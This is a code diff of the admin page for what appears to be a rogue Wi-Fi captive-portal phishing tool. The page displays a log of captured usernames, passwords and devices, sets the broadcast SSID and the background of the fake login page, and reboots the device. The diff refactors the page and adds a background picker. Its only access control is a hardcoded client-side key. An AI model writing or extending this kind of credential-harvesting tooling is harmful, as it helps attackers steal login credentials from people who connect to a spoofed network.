@@ -5,177 +5,199 @@
   <title>Login Log Viewer</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {
+    body { font-family: monospace; background:#111; color:#0f0; padding:20px; }
+    h2   { text-align:center; }
+
+    /* log box */
+    #log {
+      background:#000; padding:12px; border-radius:8px;
+      max-height:60vh; overflow-y:auto;
+      white-space:pre-wrap; line-height:1.35em; word-break:break-all;
       font-family: monospace;
-      background-color: #111;
-      color: #0f0;
-      padding: 20px;
     }
-    h2 {
-      text-align: center;
-    }
-    pre {
-      background-color: #000;
-      padding: 15px;
-      border-radius: 8px;
-      overflow-x: auto;
-      max-height: 60vh;
-      margin-bottom: 20px; 
-    }
-    .center {
-      text-align: center;
-      margin-top: 10px;
-    }
-    button { 
-      background-color: #222;
-      color: #0f0;
-      padding: 10px 20px;
-      border: 1px solid #0f0;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-      margin: 5px;
-    }
-    button:hover {
-      background-color: #0f0;
-      color: #000;
-    }
-    .status {
-      margin-top: 10px;
-      font-weight: bold;
-      opacity: 0;
-      transition: opacity 0.3s ease-in-out;
-    }
-    .status.show {
-      opacity: 1;
-    }
-    .status.success {
-      color: #0f0;
-    }
-    .status.error {
-      color: #f00;
-    }
+
+    .center { text-align:center; margin-top:10px; }
+    button  { background:#222; color:#0f0; padding:10px 20px;
+              border:1px solid #0f0; border-radius:5px; cursor:pointer; margin:5px; }
+    button:hover { background:#0f0; color:#000; }
+
+    .status       { margin-top:10px; font-weight:bold; opacity:0;
+                    transition:opacity .3s ease-in-out; }
+    .status.show  { opacity:1; }
+    .status.success{ color:#0f0; }
+    .status.error { color:#f00; }
+
+    .thumbnail {
+      width:64px; height:36px; margin:5px; cursor:pointer;
+      border:2px solid transparent; }
+    .thumbnail.selected { border-color:#0f0; }
   </style>
 </head>
 <body>
 
-  <h2>Captured Login Log</h2>
-  <pre id="log">Loading...</pre>
-	
-  <div class="center">
-    <p><strong>Current SSID:</strong> <span id="currentSSID">Loading...</span></p>
-    <form id="ssidForm" method="POST" action="/ssid">
-      <input type="text" name="ssid" id="ssidInput" placeholder="Set SSID" style="padding: 6px; width: 200px;">
-      <button type="submit">Set SSID</button>
-    </form>
-    <p id="ssidStatus" class="status"></p>
-  </div>
-	
-  <div class="center">
-    <form method="POST" action="/clear" id="clearForm">
-      <input type="hidden" name="key" value="3000">
-      <button type="submit">Clear Log</button>
-    </form>
-    <button id="markReadBtn">Mark as Read</button>
-    <p id="markStatus" class="status"></p>
-  </div>
+<h2>Captured Login Log</h2>
+<div id="log">(loading…)</div>
 
-  <script>
-    const params = new URLSearchParams(window.location.search);
-    const accessKey = params.get('key');
-    const logBox = document.getElementById('log');
-    const markStatus = document.getElementById('markStatus');
-    const clearForm = document.getElementById('clearForm');
+<!-- SSID + background form -->
+<div class="center">
+  <p><strong>Current SSID:</strong> <span id="currentSSID">Loading...</span></p>
+  <form id="ssidForm" method="POST" action="/ssid">
+    <input type="text" id="ssidInput" name="ssid" placeholder="Set SSID"
+           style="padding:6px;width:200px;">
+    <div id="bgPreview"></div>
+    <input type="hidden" id="bgInput" name="bg" value="bg1.jpg">
+    <button type="submit">Set SSID and Background</button>
+  </form>
+  <p id="ssidStatus" class="status"></p>
+</div>
 
-    function loadLog() {
-      fetch('/log.txt?v=' + Date.now())
-        .then(res => {
-          if (!res.ok) throw new Error('File not found');
-          return res.text();
-        })
-        .then(data => {
-          logBox.textContent = data.trim().length ? data : 'No logins captured yet.';
-        })
-        .catch(err => {
-          logBox.textContent = 'No logs.';
-          console.error('Log fetch error:', err);
-        });
-    }
+<!-- log controls -->
+<div class="center">
+  <form id="clearForm" method="POST" action="/clear">
+    <input type="hidden" name="key" value="3000">
+    <button type="submit">Clear Log</button>
+  </form>
+  <button id="markReadBtn">Mark as Read</button>
+  <p id="markStatus" class="status"></p>
+</div>
 
-    if (accessKey !== '3000') {
-      logBox.textContent = 'Unauthorized Access';
-      clearForm.style.display = 'none';
-      document.getElementById('markReadBtn').style.display = 'none';
-    } else {
+<script>
+/* --------------------------------------------------------------------
+   constants & helpers
+-------------------------------------------------------------------- */
+const params      = new URLSearchParams(location.search);
+const accessKey   = params.get('key');
+const logBox      = document.getElementById('log');
+const markStatus  = document.getElementById('markStatus');
+const clearForm   = document.getElementById('clearForm');
+const ssidStatus  = document.getElementById('ssidStatus');
+const bgPreview   = document.getElementById('bgPreview');
+const bgInput     = document.getElementById('bgInput');
+const backgrounds = ['bg1.jpg','bg2.jpg','bg3.jpg','bg4.jpg','bg5.jpg'];
+
+/* thumbnails ------------------------------------------------------ */
+function renderThumbnails(){
+  bgPreview.innerHTML='';
+  backgrounds.forEach(bg=>{
+    const img=document.createElement('img');
+    img.src=`/img/${bg}`; img.className='thumbnail';
+    img.onclick=()=>{
+      document.querySelectorAll('.thumbnail')
+              .forEach(t=>t.classList.remove('selected'));
+      img.classList.add('selected');
+      bgInput.value=bg;
+    };
+    bgPreview.appendChild(img);
+  });
+  bgPreview.querySelector('img')?.classList.add('selected');
+}
+
+/* log loader ------------------------------------------------------ */
+async function loadLog () {
+  const raw = await fetch('/log.txt?v=' + Date.now())
+                     .then(r => r.ok ? r.text() : '');
+
+  if (!raw.trim()) {
+    logBox.textContent = 'No logins captured yet.';
+    return;
+  }
+
+  const pretty = raw.trim()
+                    .split('\n')          // one array item per entry
+                    .reverse()            // newest first
+                    .map(line => {
+                      // ↓ NO double back-slashes
+                      const m = line.match(/\[(.*?)\] User: (.*?) \| Pass: (.*?) \| Device: (.*)/);
+                      if (!m) return line;           // leave unknown lines untouched
+                      return `[${m[1]}]\nUser: ${m[2]}\nPass: ${m[3]}\nDevice: ${m[4]}`;
+                    })
+                    .join('\n\n');        // blank line between entries
+
+  logBox.textContent = pretty;            // white-space:pre-wrap does the rest
+}
+/* current SSID ---------------------------------------------------- */
+function refreshSSID(){
+  fetch('/ssid').then(r=>r.text()).then(ssid=>{
+    document.getElementById('currentSSID').textContent=ssid;
+    document.getElementById('ssidInput').value=ssid;
+  }).catch(()=>{ document.getElementById('currentSSID').textContent='Unavailable'; });
+}
+
+/* ------------------------------------------------------------------
+   access control
+------------------------------------------------------------------ */
+if(accessKey!=='3000'){
+  logBox.textContent='Unauthorized Access';
+  clearForm.style.display='none';
+  document.getElementById('markReadBtn').style.display='none';
+  document.getElementById('ssidForm').style.display='none';
+}else{
+  renderThumbnails();
+  loadLog();
+  refreshSSID();
+}
+
+/* ------------------------------------------------------------------
+   mark as read
+------------------------------------------------------------------ */
+document.getElementById('markReadBtn').onclick=()=>{
+  fetch('/mark-read',{method:'POST'})
+   .then(r=>r.text()).then(msg=>{
+      markStatus.textContent=msg||'Marked as read!';
+      markStatus.className='status success show';
+      setTimeout(()=>markStatus.classList.remove('show'),3000);
       loadLog();
-    }
+   }).catch(()=>{
+      markStatus.textContent='Failed to mark as read.';
+      markStatus.className='status error show';
+      setTimeout(()=>markStatus.classList.remove('show'),3000);
+   });
+};
 
-    document.getElementById('markReadBtn').addEventListener('click', () => {
-      fetch('/mark-read', { method: 'POST' })
-        .then(res => res.text())
-        .then(msg => {
-          markStatus.innerText = msg || 'Marked as read!';
-          markStatus.classList.add('success', 'show');
-          setTimeout(() => markStatus.classList.remove('show'), 3000);
-        })
-        .catch(() => {
-          markStatus.innerText = 'Failed to mark as read.';
-          markStatus.classList.add('error', 'show');
-          setTimeout(() => markStatus.classList.remove('show'), 3000);
-        });
-    });
+/* ------------------------------------------------------------------
+   clear log
+------------------------------------------------------------------ */
+clearForm.onsubmit=e=>{
+  e.preventDefault();
+  if(!confirm('Are you sure you want to clear the log?')) return;
+  fetch('/clear',{method:'POST',body:new FormData(clearForm)})
+   .then(r=>r.text()).then(msg=>{
+      markStatus.textContent=msg||'Log cleared!';
+      markStatus.className='status success show';
+      loadLog();
+      setTimeout(()=>markStatus.classList.remove('show'),3000);
+   }).catch(()=>{
+      markStatus.textContent='Failed to clear log.';
+      markStatus.className='status error show';
+      setTimeout(()=>markStatus.classList.remove('show'),3000);
+   });
+};
 
-    clearForm.addEventListener('submit', (e) => {
-      e.preventDefault();
-      if (!confirm('Are you sure you want to clear the log?')) return;
-      const formData = new FormData(clearForm);
-      fetch('/clear', {
-        method: 'POST',
-        body: formData
-      })
-        .then(res => res.text())
-        .then(msg => {
-          markStatus.innerText = msg || 'Log cleared!';
-          markStatus.classList.add('success', 'show');
-          loadLog();
-          setTimeout(() => markStatus.classList.remove('show'), 3000);
-        })
-        .catch(() => {
-          markStatus.innerText = 'Failed to clear log.';
-          markStatus.classList.add('error', 'show');
-          setTimeout(() => markStatus.classList.remove('show'), 3000);
-        });
-    });
+/* ------------------------------------------------------------------
+   SSID + background form
+------------------------------------------------------------------ */
+document.getElementById('ssidForm').onsubmit=e=>{
+  e.preventDefault();
+  const ssidVal=document.getElementById('ssidInput').value.trim();
+  const bgVal  =bgInput.value;
 
-    function refreshSSID() {
-      fetch('/ssid')
-        .then(res => res.text())
-        .then(ssid => {
-          document.getElementById('currentSSID').innerText = ssid;
-          document.getElementById('ssidInput').value = ssid;
-        })
-        .catch(() => {
-          document.getElementById('currentSSID').innerText = 'Unavailable';
-        });
-    }
+  ssidStatus.textContent='Applying changes…';
+  ssidStatus.className='status success show';
 
-    document.getElementById('ssidForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-      const formData = new FormData(this);
-      const statusBox = document.getElementById('ssidStatus');
+  // 1) save background
+  fetch('/bg',{method:'POST',
+               headers:{'Content-Type':'application/x-www-form-urlencoded'},
+               body:`bg=/img/${encodeURIComponent(bgVal)}`}).catch(()=>{});
 
-      statusBox.textContent = "SSID updated. Rebooting...";
-      statusBox.className = "status success show";
+  // 2) save SSID after 500 ms
+  setTimeout(()=>{
+    const fd=new FormData(); fd.append('ssid',ssidVal);
+    fetch('/ssid',{method:'POST',body:fd}).catch(()=>{});
+  },500);
 
-      fetch('/ssid', {
-        method: 'POST',
-        body: formData
-      });
-
-      setTimeout(() => statusBox.classList.remove('show'), 3000);
-    });
-
-    refreshSSID();
+  // 3) notify reboot
+  setTimeout(()=>{ ssidStatus.textContent='Rebooting to apply settings…'; },2000);
+};
 </script>
 </body>
 </html>
